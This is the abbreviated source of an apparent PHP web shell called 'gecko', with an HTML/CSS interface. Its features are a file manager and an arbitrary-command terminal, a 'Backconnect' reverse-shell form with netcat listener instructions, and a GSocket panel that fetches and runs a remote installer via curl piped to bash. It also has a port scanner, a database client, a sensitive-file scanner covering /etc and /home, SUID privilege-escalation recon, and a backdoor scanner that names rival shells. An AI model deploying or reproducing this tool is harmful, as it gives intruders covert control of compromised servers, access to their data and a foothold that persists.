...
function formatBytes($bytes)
{
    ...
    foreach ($units as $u) {
        if ($v < 1024)
            return number_format($v, $v >= 100 ? 0 : 1) . ' ' . $u;
        $v /= 1024;
    }
...
function runTerminal($command, $cwd)
{
    ...
    if (!is_resource($proc))
        return array('output' => 'Failed to execute.', 'exit_code' => 1);
    fclose($pipes[0]);
...
function searchFiles($baseDir, $relDir, $query, &$results, &$count, $limit = 200)
{
    ...
    while (($name = readdir($h)) !== false) {
        ...
        if (is_dir($full))
            searchFiles($baseDir, $itemRel, $query, $results, $count, $limit);
    }
    closedir($h);
}
...
function secRecon($baseDir)
{
    ...
    if (function_exists('posix_geteuid')) {
        ...
        if ($pw)
            $lines[] = 'Account   : ' . $pw['name'] . ' (home: ' . (isset($pw['dir']) ? $pw['dir'] : '-') . ')';
...
function secSensitiveScan($baseDir, $scanPath)
{
    ...
    if (empty($roots)) {
        ...
        foreach (array('/var/www', '/home', '/etc', '/tmp', dirname($baseDir)) as $r) {
            if (@is_dir($r) && !in_array($r, $roots, true))
                $roots[] = $r;
        }
    }
    ...
    if (empty($found))
        $lines[] = '(no sensitive files found in scan scope)';
...
{
    if ($depth > $maxDepth || count($found) >= 80)
        return;
    $h = @opendir($dir);
    if (!$h)
        return;
...
function secHttpRequest($url, $method, $headersRaw, $body)
{
    ...
    if (function_exists('curl_init')) {
        ...
        curl_close($ch);
        if ($resp === false)
            return array('ok' => false, 'error' => $err ? $err : 'Request failed');
        $out = "=== HTTP RESPONSE ===\n";
        $out .= 'URL    : ' . $url . "\n";
        $out .= 'Method : ' . $method . "\n";
...
function secCodec($mode, $text)
{
    ...
    switch ($mode) {
        ...
        case 'b64dec':
            ...
            if ($decoded === false)
                return array('ok' => false, 'error' => 'Invalid Base64');
            $result = $decoded;
            break;
        case 'urlenc':
        ...
        case 'hexdec':
            ...
            if (strlen($clean) % 2 !== 0)
                return array('ok' => false, 'error' => 'Odd-length hex');
            $result = pack('H*', $clean);
            break;
        default:
...
function secDns($host, $type)
{
    ...
    if ($type === 'ALL') {
        ...
        if (!isset($map[$type]))
            return array('ok' => false, 'error' => 'Invalid record type');
...
function btAnalyzeFile($path, $signatures, $filenameIOCs, $selfPath, $aggressive)
{
    ...
    if ($realSelf && $realPath && $realSelf === $realPath)
        return null;
...
{
    if ($depth > $maxDepth || count($files) >= $maxFiles)
        return;
    $h = @opendir($dir);
    if (!$h)
        return;
...
function btLoadManifest($baseDir)
{
    ...
    foreach ($data as $entry) {
        if (!is_array($entry) || empty($entry['id']) || empty($entry['original']))
            continue;
        if (!empty($entry['quarantine']) && !is_file($entry['quarantine']))
            continue;
        $valid[] = $entry;
    }
...
function btListQuarantine($baseDir)
{
    ...
    if (empty($entries))
        $lines[] = '(empty — no quarantined files)';
    return array(
        'ok' => true,
        'output' => implode("\n", $lines),
        'entries' => $entries,
...
function btWritableScan($baseDir, $scanPath)
{
    ...
    if (count($lines) <= 2)
        $lines[] = $isWin ? '(Linux permission scan only)' : '(no world-writable files found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}
...
function btHiddenScan($baseDir, $scanPath)
{
    ...
    if (count($lines) <= 2)
        $lines[] = '(no suspicious hidden scripts found)';
    return array('ok' => true, 'output' => implode("\n", $lines));
}
...
if (isset($_GET['api'])) {
    ...
    switch ($action) {
        ...
        case 'read':
            ...
            if (!$path || is_dir($path))
                jsonOut(array('ok' => false, 'error' => 'File not found'), 404);
            $sz = filesize($path);
            if (!isTextFile($path) && (int) ($sz ? $sz : 0) > 512000)
                jsonOut(array('ok' => false, 'error' => 'File too large or binary'), 400);
            jsonOut(array(
                'ok' => true,
        ...
        case 'save':
            ...
            if (!$path || is_dir($path))
                jsonOut(array('ok' => false, 'error' => 'File not found'), 404);
            if (file_put_contents($path, (string) _v($input, 'content', '')) === false)
                jsonOut(array('ok' => false, 'error' => 'Write failed'), 500);
        ...
        case 'mkdir':
            ...
            if ($name === '' || preg_match('/[<>:"|?*\\\\\/]/', $name))
                jsonOut(array('ok' => false, 'error' => 'Invalid name'), 400);
            $parent = resolvePath($baseDir, $rel);
            if (!$parent || !is_dir($parent))
                jsonOut(array('ok' => false, 'error' => 'Invalid directory'), 403);
            $new = $parent . DIRECTORY_SEPARATOR . $name;
            if (file_exists($new))
                jsonOut(array('ok' => false, 'error' => 'Already exists'), 409);
            if (!@mkdir($new, 0755))
                jsonOut(array('ok' => false, 'error' => 'Create failed'), 500);
        ...
        case 'create_file':
            ...
            if (file_exists($new))
                jsonOut(array('ok' => false, 'error' => 'Already exists'), 409);
            if (file_put_contents($new, (string) _v($input, 'content', '')) === false)
                jsonOut(array('ok' => false, 'error' => 'Create failed'), 500);
            jsonOut(array('ok' => true));
            break;
        ...
        case 'delete':
            ...
            if (!$path || $path === $baseDir)
                jsonOut(array('ok' => false, 'error' => 'Cannot delete'), 403);
            $ok = is_dir($path) ? @rmdir($path) : @unlink($path);
            if (!$ok)
                jsonOut(array('ok' => false, 'error' => 'Delete failed (folder must be empty)'), 500);
            jsonOut(array('ok' => true));
            break;
        ...
        case 'rename':
            ...
            if (!$path || $newName === '' || preg_match('/[<>:"|?*\\\\\/]/', $newName))
                jsonOut(array('ok' => false, 'error' => 'Invalid request'), 400);
            $dest = dirname($path) . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($dest))
                jsonOut(array('ok' => false, 'error' => 'Name taken'), 409);
            if (!@rename($path, $dest))
                jsonOut(array('ok' => false, 'error' => 'Rename failed'), 500);
        ...
        case 'search':
            ...
            if ($query === '')
                jsonOut(array('ok' => true, 'results' => array()));
            $results = array();
            $count = 0;
        ...
        case 'terminal':
            ...
            if (!$cwd || !is_dir($cwd))
                jsonOut(array('ok' => false, 'error' => 'Invalid cwd'), 403);
            $command = trim((string) _v($input, 'command', ''));
            if ($command === '')
                jsonOut(array('ok' => false, 'error' => 'Empty command'), 400);
...
<head>
    ...
    Ultra-deep ink, warm champagne gold accent, soft pearl text. */
        ...
        *::after {
        ...
        .sb-btn:hover .sb-ico::after {
            opacity: 1
        }

        .sb-btn:hover .sb-ico svg {
            opacity: 1
        }
        ...
        .sb-btn.danger .sb-ico svg {
            stroke: var(--tx3)
        }

        .sb-btn.danger:hover .sb-ico svg {
            stroke: var(--red)
        }

        .sb-btn.danger:hover .sb-arrow {
            color: var(--red)
        }
        ...
        .tbl-head .th-sort:hover {
            color: var(--tx);
            background: var(--ink3)
        }

        .tbl-head .th-sort.active {
            color: var(--jade)
        }
        ...
        .tbl-head .th-sort.active .th-arrow {
            opacity: 1
        }

        .tbl-head .th-sort.active.desc .th-arrow {
        ...
        .frow:hover {
            background: rgba(245, 185, 66, .025)
        }
        ...
        [data-icon="folder"] {
            --type-color: #f5b942;
            --type-bd: rgba(245, 185, 66, .32)
        }

        [data-icon="php"] {
            --type-color: #a78bfa;
            --type-bd: rgba(167, 139, 250, .32)
        }

        [data-icon="js"] {
            --type-color: #f1e05a;
            --type-bd: rgba(241, 224, 90, .32)
        }

        [data-icon="css"] {
            --type-color: #ff7b72;
            --type-bd: rgba(255, 123, 114, .32)
        }

        [data-icon="html"] {
            --type-color: #ff9f6e;
            --type-bd: rgba(255, 159, 110, .32)
        }

        [data-icon="config"] {
            --type-color: #a5d6ff;
            --type-bd: rgba(165, 214, 255, .32)
        }

        [data-icon="text"] {
            --type-color: #c9d1d9;
            --type-bd: rgba(201, 209, 217, .28)
        }

        [data-icon="image"] {
            --type-color: #7ee787;
            --type-bd: rgba(126, 231, 135, .32)
        }

        [data-icon="archive"] {
            --type-color: #ffa657;
            --type-bd: rgba(255, 166, 87, .32)
        }

        [data-icon="database"] {
            --type-color: #d2a8ff;
            --type-bd: rgba(210, 168, 255, .32)
        }

        [data-icon="file"] {
            --type-color: #8b949e;
            --type-bd: rgba(139, 148, 158, .28)
        }
        ...
        @media (max-width: 640px) {
            ...
            .bulk-bar .bulk-btn span:not(.bulk-only) {
                display: none
            }
        }
        ...
        @keyframes pulseDot {
            ...
            0%,
            100% {
                box-shadow: 0 0 0 0 rgba(245, 185, 66, .5);
                opacity: 1
            }

            50% {
                box-shadow: 0 0 0 5px rgba(245, 185, 66, 0);
                opacity: .6
            }
        }
        ...
        .ed-area textarea::selection {
            background: rgba(245, 185, 66, .30);
            color: transparent
        }

        .ed-area textarea::-moz-selection {
            background: rgba(245, 185, 66, .30);
            color: transparent
        }
        ...
        .ed-area.no-highlight .ed-highlight {
            display: none
        }
        ...
        .blue-badge.high {
            ...
            color: var(--amber);
            border: 1px solid rgba(212, 150, 31, .3)
        }
        ...
        .blue-threat-item:last-child {
            border-bottom: none
        }

        .blue-threat-item:hover {
            background: rgba(245, 185, 66, .03)
        }

        .blue-threat-item input {
            margin-top: 3px;
            flex-shrink: 0;
        ...
        .blue-threat-sev.CRITICAL {
            background: var(--red-bg);
            color: var(--red)
        }

        .blue-threat-sev.HIGH {
            background: var(--amber-bg);
            color: var(--amber)
        }

        .blue-threat-sev.MEDIUM {
        ...
        .blue-threat-actions.show {
            display: flex
        }

        .blue-threat-actions .btn-danger {
            background: var(--red-bg);
            border-color: var(--red-bd);
            color: var(--red)
        }

        .blue-threat-actions .btn-danger:hover {
        ...
        .term-dots i:nth-child(1) {
            background: linear-gradient(135deg, #ff7a6e, #ff5f57)
        }

        .term-dots i:nth-child(2) {
            background: linear-gradient(135deg, #ffd13b, #febc2e)
        }
        ...
        .term-block.success {
            border-left-color: var(--jade-bd2)
        }
        ...
        .term-block.success .term-duration {
            color: var(--jade);
            border-color: var(--jade-bd)
        }

        .term-block.error .term-duration {
            color: var(--red);
            border-color: rgba(248, 113, 113, .3)
        }
        ...
        .term-block.error .term-out-text {
            color: #ffb3b3
        }

        .term-block.dim .term-out-text {
            color: var(--tx4);
            font-style: italic
        }
        ...
        .term-running-dots span:nth-child(2) {
            animation-delay: .15s
        }

        .term-running-dots span:nth-child(3) {
            animation-delay: .3s
        }
        ...
        .toast.ok .t-dot {
            background: var(--jade);
            box-shadow: 0 0 0 3px var(--jade-bg), 0 0 8px var(--jade)
        }
        ...
        @media (max-width: 960px) {
            ...
            .tbl-head,
            .frow {
                grid-template-columns: 36px 1fr 100px 86px
            }
...
<body>
    ...
    <div class="shell">
        ...
        <header class="topbar">
            <button class="btn-burger" id="btnBurger" aria-label="Toggle menu" aria-controls="sidebar"
                aria-expanded="false">
                <svg viewBox="0 0 24 24">
                    <path
                        d="M3 6.5A1.5 1.5 0 0 1 4.5 5h15a1.5 1.5 0 0 1 0 3h-15A1.5 1.5 0 0 1 3 6.5Zm0 5.5A1.5 1.5 0 0 1 4.5 10.5h15a1.5 1.5 0 0 1 0 3h-15A1.5 1.5 0 0 1 3 12Zm1.5 4A1.5 1.5 0 0 0 3 17.5 1.5 1.5 0 0 0 4.5 19h15a1.5 1.5 0 0 0 0-3h-15Z" />
                </svg>
            </button>
            ...
            <div class="search-wrap">
                <svg class="search-ico" viewBox="0 0 16 16">
                    <path
                ...
                <div class="view-pills">
                    <button class="view-pill" id="btnList" title="List view">
                        <svg viewBox="0 0 16 16">
                            <path
                                d="M2 2.75A.75.75 0 0 1 2.75 2h10.5a.75.75 0 0 1 0 1.5H2.75A.75.75 0 0 1 2 2.75Zm0 5A.75.75 0 0 1 2.75 7h10.5a.75.75 0 0 1 0 1.5H2.75A.75.75 0 0 1 2 7.75ZM2.75 12h10.5a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5Z" />
                        </svg>
                    </button>
                    <button class="view-pill" id="btnGrid" title="Grid view">
                        <svg viewBox="0 0 16 16">
                            <path
                                d="M1 2.75A1.75 1.75 0 0 1 2.75 1h2.5A1.75 1.75 0 0 1 7 2.75v2.5A1.75 1.75 0 0 1 5.25 7h-2.5A1.75 1.75 0 0 1 1 5.25Zm8.75-1.75A1.75 1.75 0 0 0 8 2.75v2.5A1.75 1.75 0 0 0 9.75 7h2.5A1.75 1.75 0 0 0 14 5.25v-2.5A1.75 1.75 0 0 0 12.25 1ZM1 9.75A1.75 1.75 0 0 1 2.75 8h2.5A1.75 1.75 0 0 1 7 9.75v2.5A1.75 1.75 0 0 1 5.25 14h-2.5A1.75 1.75 0 0 1 1 12.25Zm8.75-1.75A1.75 1.75 0 0 0 8 9.75v2.5A1.75 1.75 0 0 0 9.75 14h2.5A1.75 1.75 0 0 0 14 12.25v-2.5A1.75 1.75 0 0 0 12.25 8Z" />
                        </svg>
                    </button>
                </div>
                ...
                <div class="sb-scroll">
                    <div class="sidebar-top">
                        ...
                        <button class="sb-btn" id="sbNewFile">
                            <span class="sb-ico"><svg viewBox="0 0 24 24">
                        ...
                        <button class="sb-btn" id="sbNewFolder">
                            <span class="sb-ico"><svg viewBox="0 0 24 24">
                                    <path
                                        d="M3 5a2 2 0 0 1 2-2h4l2 3h7a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
                    ...
                    <div class="sidebar-top" style="padding-top:8px">
                        ...
                        <button class="sb-btn" id="sbRefresh">
                            <span class="sb-ico"><svg viewBox="0 0 24 24">
                                    <path d="M3 12a9 9 0 0 1 15.18-6.36L21 8" />
                                    <path d="M21 3v5h-5" />
                                    <path d="M21 12a9 9 0 0 1-15.18 6.36L3 16" />
                                    <path d="M3 21v-5h5" />
                                </svg></span>
                            Refresh
                            <span class="sb-arrow">›</span>
                        ...
                        <button class="sb-btn" id="sbBackconnect">
                            <span class="sb-ico"><svg viewBox="0 0 24 24">
                                    ...
                                    <path d="M4 9h10a5 5 0 0 1 5 5v1" />
                                </svg></span>
                            Backconnect
                            <span class="sb-arrow">›</span>
                        </button>
                    ...
                    <div class="sidebar-top" style="padding-top:8px">
                        ...
                        <button class="sb-btn" id="sbBlueBackdoor">
                            <span class="sb-ico"><svg viewBox="0 0 24 24">
                                    <path
                                        d="M12 2a4 4 0 0 1 4 4c0 1.5-.8 2.8-2 3.5V12h3a3 3 0 0 1 3 3v1H7v-1a3 3 0 0 1 3-3h3V9.5A4 4 0 0 1 12 2z" />
                                    <path d="M9 19h6" />
                                </svg></span>
                            Backdoor Scanner
                            <span class="sb-arrow">›</span>
            ...
            <main class="main">
                <div class="actionbar">
                    ...
                    <button class="btn btn-ghost btn-icon" id="btnUp" title="Go up" style="visibility:hidden">
                        <svg viewBox="0 0 16 16">
                            <path
                                d="m7.78 12.53-4.25-4.25a.749.749 0 0 1 0-1.061l4.25-4.25a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L4.811 7.25h7.939a.75.75 0 0 1 0 1.5H4.811l2.829 2.829a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215Z" />
                        </svg>
                    </button>
                ...
                <div class="panel" id="panel">
                    <div class="empty" id="loading">
                        <div class="empty-ico"><svg class="spin" viewBox="0 0 16 16">
                                <path d="M8 0a8 8 0 0 1 8 8h-1.5A6.5 6.5 0 0 0 8 1.5V0Z" fill="currentColor" />
                            </svg></div>
    ...
    <div class="overlay" id="mCreate">
        <div class="modal m-sm">
            <div class="modal-head">
                <h2 id="createTitle">New File</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <div class="fg"><label>Name</label><input type="text" id="createName" placeholder="filename.ext"></div>
                <div class="fg hidden" id="createContentWrap"><label>Initial content (optional)</label><textarea
                        id="createContent" rows="4"></textarea></div>
            </div>
            <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary"
                    id="createOk">Create</button></div>
        </div>
    </div>
    ...
    <div class="overlay" id="mRename">
        <div class="modal m-sm">
            <div class="modal-head">
                <h2>Rename</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <div class="fg"><label>New name</label><input type="text" id="renameInput"></div>
            </div>
            <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary"
                    id="renameOk">Rename</button></div>
        </div>
    </div>
    ...
    <div class="overlay" id="mChmod">
        <div class="modal m-sm">
            <div class="modal-head">
                <h2>Permissions (Chmod)</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <div class="fg">
    ...
    <div class="overlay" id="mDelete">
        <div class="modal m-sm">
            <div class="modal-head">
                <h2>Delete</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <p id="deleteMsg" style="color:var(--tx2);font-size:14px;line-height:1.6"></p>
            </div>
            <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-danger"
                    id="deleteOk">Delete</button></div>
        </div>
    </div>
    ...
    <div class="overlay" id="mUpload">
        <div class="modal m-md">
            <div class="modal-head">
                <h2>Upload Files</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <div class="dropzone" id="dropzone">
                    <svg viewBox="0 0 16 16">
                        <path
                            d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z" />
                        <path
                            d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.25 3.25a.75.75 0 0 1-1.06 0L3.53 7.28a.75.75 0 0 1 1.06-1.06l2.66 2.347Z" />
                    </svg>
                    ...
                    <p style="font-size:10px;margin-top:4px;color:var(--tx4)">Max file size:
        ...
        <div class="modal m-full">
            ...
            <div class="modal-body" style="padding:0;display:flex;flex-direction:column">
                <div class="editor-wrap">
                    ...
                    <div class="ed-area" id="edArea">
                        ...
                        <textarea id="edText" spellcheck="false" autocomplete="off" autocorrect="off"
            ...
            <div class="modal-foot">
                ...
                <button class="btn btn-primary" id="edSave">
                    <svg viewBox="0 0 16 16">
                        <path
                            d="M2.75 1A1.75 1.75 0 0 0 1 2.75v10.5c0 .966.784 1.75 1.75 1.75h10.5A1.75 1.75 0 0 0 15 13.25V2.75A1.75 1.75 0 0 0 13.25 1H2.75ZM3.5 6.25V2.5h4.75v3.75H3.5Zm9 7.25H3.5V9.5h9v4Z" />
                    </svg>
                    Save
                </button>
            </div>
            ...
            <div class="modal-body">
                <div class="term-top">
                    ...
                    <div class="term-title-area">
                        <div class="term-title">
                            <svg class="term-title-icon" viewBox="0 0 24 24" stroke-width="2.5" stroke-linecap="round"
                                stroke-linejoin="round">
                                <path d="M5 8l4 4-4 4" />
                                <path d="M12 16h7" />
                            </svg>
                    ...
                    <div class="term-actions">
                        <span class="term-stats" id="termStats" title="Commands executed"><b
                                id="termCount">0</b><span>cmds</span></span>
                ...
                <div class="term-in-row">
                    <div class="term-prompt-area">
                        <span class="term-prompt-user">gecko</span><span class="term-prompt-at">@</span><span
                            class="term-prompt-host">shell</span><span class="term-prompt-colon">:</span><span
                            class="term-prompt-cwd" id="termPromptCwd">~</span>
    ...
    <div class="overlay" id="mCron">
        <div class="modal m-lg">
            <div class="modal-head">
                <h2>⏰ Cron Manager</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <p class="tool-note" id="cronPlatformNote">Loading crontab…</p>
                <div class="fg"><label>Crontab entries</label><textarea id="cronContent" rows="14" spellcheck="false"
                        placeholder="* * * * * /usr/bin/php /path/to/script.php"></textarea></div>
            </div>
            <div class="modal-foot">
                <button class="btn mc">Close</button>
    ...
    <div class="overlay" id="mBackconnect">
        <div class="modal m-md">
            <div class="modal-head">
                <h2>🔗 Backconnect</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <div class="tool-grid">
                    <div class="fg"><label>Your IP / Host</label><input type="text" id="bcIp"
                            placeholder="192.168.1.100"></div>
                    <div class="fg"><label>Port</label><input type="number" id="bcPort" value="4444" min="1"
                            max="65535"></div>
                ...
                <p class="tool-note">Start listener first: <code>nc -lvnp PORT</code> or
                    <code>rlwrap nc -lvnp PORT</code></p>
    ...
    <div class="overlay" id="mGsocket">
        <div class="modal m-lg">
            <div class="modal-head">
                <h2>⚡ GSocket</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <div class="tool-grid">
                    <div class="fg span2"><label>Download method</label>
                        <select id="gsMethod">
                            ...
                            <option value="wget">wget — GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate …)"
                            </option>
                        </select>
                    </div>
                </div>
                <div class="tool-cmd" id="gsCmdPreview">GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"
                </div>
                <p class="tool-note">Installer dari gsocket.io/y. Jika GSRN firewalled, otomatis retry
                    <code>GS_PORT=22</code> s/d <code>67</code>.</p>
    ...
    <div class="overlay" id="mPortScan">
        <div class="modal m-lg">
            <div class="modal-head">
                <h2>🌐 Port Scanner</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <div class="tool-grid">
                    <div class="fg"><label>Target Host</label><input type="text" id="psHost" value="127.0.0.1"
                            placeholder="127.0.0.1"></div>
                    <div class="fg"><label>Ports</label><input type="text" id="psPorts"
                            value="21,22,25,80,443,3306,8080" placeholder="22,80,443 or 1-1024"></div>
                    <div class="fg"><label>Timeout (sec)</label><input type="number" id="psTimeout" value="1" min="1"
                            max="5"></div>
                </div>
    ...
    <div class="overlay" id="mAdminer">
        <div class="modal m-full">
            <div class="modal-head">
                ...
                <button class="btn btn-ghost btn-sm" id="dbOpenAdminer" title="Open full Adminer">Full Adminer
                    ↗</button>
                <button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <div class="tool-grid">
                    ...
                    <div class="fg"><label>Database</label><input type="text" id="dbName" placeholder="database name">
                    </div>
                </div>
                <div class="db-tables" id="dbTables"></div>
                <div class="fg" style="margin-top:14px"><label>SQL Query</label><textarea id="dbSql" rows="5"
                        spellcheck="false" placeholder="SELECT * FROM users LIMIT 10;"></textarea></div>
                <div id="dbResult"></div>
            </div>
            <div class="modal-foot">
            ...
            <div class="modal-body" style="padding:0;display:flex;flex-direction:column">
                ...
                <div style="padding:16px;overflow:auto;flex:1">
                    ...
                    <div class="sec-panel active" data-panel="recon">
                        ...
                        <div class="tool-output tall empty" id="secOutRecon">System info, user/privilege, PHP security
                            restrictions, kernel &amp; env.</div>
                    </div>

                    <div class="sec-panel" data-panel="sensitive">
                        <div class="tool-grid">
                            <div class="fg span2"><label>Scan path (optional)</label><input type="text" id="secSensPath"
                                    placeholder="Leave empty = base + common dirs"></div>
                        </div>
                        <div class="sec-actions">
                    ...
                    <div class="sec-panel" data-panel="processes">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunProcesses">List
                                Processes</button></div>
                        <div class="tool-output tall empty" id="secOutProcesses">ps aux / tasklist output.</div>
                    </div>

                    <div class="sec-panel" data-panel="network">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunNetwork">Show
                                Network</button></div>
                        <div class="tool-output tall empty" id="secOutNetwork">Listening ports, connections, interfaces.
                        </div>
                    </div>

                    <div class="sec-panel" data-panel="http">
                        <div class="tool-grid">
                            <div class="fg span2"><label>URL</label><input type="text" id="secHttpUrl"
                                    placeholder="https://example.com/api"></div>
                            ...
                            <div class="fg span2"><label>Headers (one per line)</label><textarea id="secHttpHeaders"
                                    rows="2" placeholder="User-Agent: GeckoSec&#10;Accept: */*"></textarea></div>
                            <div class="fg span2"><label>Body</label><textarea id="secHttpBody" rows="3"
                                    placeholder="POST body…"></textarea></div>
                        </div>
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunHttp">Send
                                Request</button></div>
                    ...
                    <div class="sec-panel" data-panel="hash">
                        <div class="tool-grid">
                            ...
                            <div class="fg span2"><label>Input</label><textarea id="secHashText" rows="4"
                                    placeholder="Text to hash…"></textarea></div>
                        </div>
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunHash">Generate
                                Hash</button></div>
                    ...
                    <div class="sec-panel" data-panel="codec">
                        <div class="tool-grid">
                            ...
                            <div class="fg span2"><label>Input</label><textarea id="secCodecText" rows="4"></textarea>
                            </div>
                        </div>
                        <div class="sec-actions"><button class="btn btn-primary btn-sm"
                                id="secRunCodec">Transform</button></div>
                        <div class="tool-output tall empty" id="secOutCodec">Encoded/decoded output.</div>
                    </div>

                    <div class="sec-panel" data-panel="dns">
                        <div class="tool-grid">
                            <div class="fg"><label>Host</label><input type="text" id="secDnsHost"
                                    placeholder="example.com"></div>
                            <div class="fg"><label>Record type</label>
                                <select id="secDnsType">
                        ...
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunDns">Lookup
                                DNS</button></div>
                        <div class="tool-output tall empty" id="secOutDns">DNS records.</div>
                    </div>

                    <div class="sec-panel" data-panel="suid">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunSuid">Find
                                SUID/SGID/CAP</button></div>
                        <p class="tool-note">Privilege escalation recon — setuid binaries, setgid, Linux capabilities.
                        </p>
            ...
            <div class="modal-body" style="padding:0;display:flex;flex-direction:column">
                ...
                <div style="padding:16px;overflow:auto;flex:1">
                    ...
                    <div class="sec-panel active" data-bpanel="backdoor">
                        <div class="tool-grid">
                            <div class="fg span2"><label>Scan path (optional)</label><input type="text"
                                    id="blueScanPath" placeholder="Document root + /var/www /home /tmp /opt"></div>
                            <div class="fg span2"><label
                                    style="display:flex;align-items:center;gap:8px;cursor:pointer"><input
                                        type="checkbox" id="blueAggressive" checked style="width:auto"> Aggressive mode
                                    (8000 files · depth 14 · lower threshold · polyglot scan)</label></div>
                        </div>
                        <div class="sec-actions">
                        ...
                        <p class="tool-note">Scoring: CRITICAL ≥50 · HIGH ≥30 · MEDIUM ≥15 · LOW ≥6 (aggressive). Review
                            before quarantine — false positives possible on legit apps.</p>
                        ...
                        <div style="margin-top:18px;padding-top:14px;border-top:1px solid var(--bd2)">
                            <div class="sec-actions" style="margin-bottom:8px">
                                ...
                                <button class="btn btn-primary btn-sm" id="blueRestoreSelected">Restore
                                    Selected</button>
                                <button class="btn btn-primary btn-sm" id="blueRestoreAll">Restore All</button>
                            </div>
                            <p class="tool-note" id="blueQuarantineDir">Removed files are moved to system tmp — restore
                                anytime.</p>
                            <div class="blue-threat-wrap" id="blueQuarantineList">
                                <div class="blue-threat-item" style="color:var(--tx4);font-style:italic">No quarantined
                                    files.</div>
                            </div>
                        </div>
                    </div>
                    ...
                    <div class="sec-panel" data-bpanel="fullaudit">
                        <div class="tool-grid">
                            <div class="fg span2"><label>Scan path (optional)</label><input type="text"
                                    id="blueAuditPath" placeholder="Same as backdoor scan scope"></div>
                        </div>
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunFullAudit">Run Full
                                Audit</button></div>
                        <p class="tool-note">Runs: backdoor scan, recent changes, writable files, hidden scripts, cron
                            audit, IOC hunt, suspicious processes, log audit.</p>
                        <div class="tool-output tall empty" id="blueOutFullAudit">Comprehensive blue team assessment
                            (may take several minutes).</div>
                    </div>

                    <div class="sec-panel" data-bpanel="recent">
                        <div class="tool-grid">
                            <div class="fg"><label>Days</label><input type="number" id="blueRecentDays" value="7"
                                    min="1" max="90"></div>
                            <div class="fg"><label>Path (optional)</label><input type="text" id="blueRecentPath"
                                    placeholder="Web root"></div>
                        </div>
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunRecent">Find Recent
                                Changes</button></div>
                        <div class="tool-output tall empty" id="blueOutRecent">Recently modified PHP/JS/.htaccess files.
                        </div>
                    </div>

                    <div class="sec-panel" data-bpanel="writable">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunWritable">Scan
                                Writable Files</button></div>
                        <div class="tool-output tall empty" id="blueOutWritable">World-writable files &amp; directories
                            (777 / o+w).</div>
                    </div>

                    <div class="sec-panel" data-bpanel="hidden">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunHidden">Scan Hidden
                                Scripts</button></div>
                        <div class="tool-output tall empty" id="blueOutHidden">Dot-files: .htaccess, .user.ini, hidden
                            PHP shells.</div>
                    </div>

                    <div class="sec-panel" data-bpanel="cron">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunCron">Audit Cron
                                Jobs</button></div>
                        <div class="tool-output tall empty" id="blueOutCron">Detects persistence: curl|sh, /dev/tcp,
                            reverse shells, base64 decode…</div>
                    </div>

                    <div class="sec-panel" data-bpanel="logs">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunLogs">Audit
                                Logs</button></div>
                        <div class="tool-output tall empty" id="blueOutLogs">Failed auth, sudo usage, suspicious web
                            server errors.</div>
                    </div>

                    <div class="sec-panel" data-bpanel="ioc">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunIoc">Hunt IOC
                                Filenames</button></div>
                        <div class="tool-output tall empty" id="blueOutIoc">Known malicious filenames: c99, r57, wso,
                            b374k, alfa…</div>
                    </div>

                    <div class="sec-panel" data-bpanel="process">
                        <div class="sec-actions"><button class="btn btn-primary btn-sm" id="blueRunProcess">Scan
                                Processes</button></div>
                        <div class="tool-output tall empty" id="blueOutProcess">nc, /dev/tcp, reverse shells, miners,
                            scanners.</div>
                    </div>
    ...
    <div class="overlay" id="mBlueDelete">
        <div class="modal m-sm">
            <div class="modal-head">
                <h2>📦 Move to Quarantine</h2><button class="btn btn-ghost btn-icon mc">✕</button>
            </div>
            <div class="modal-body">
                <p id="blueDeleteMsg" style="color:var(--tx2);font-size:14px;line-height:1.6"></p>
                <p class="tool-note" style="margin-top:10px">Files dipindah ke folder tmp (bukan dihapus permanen). Bisa
                    di-restore kapan saja dari section Quarantine di bawah.</p>
            </div>
            <div class="modal-foot">
                <button class="btn mc">Cancel</button>
        ...
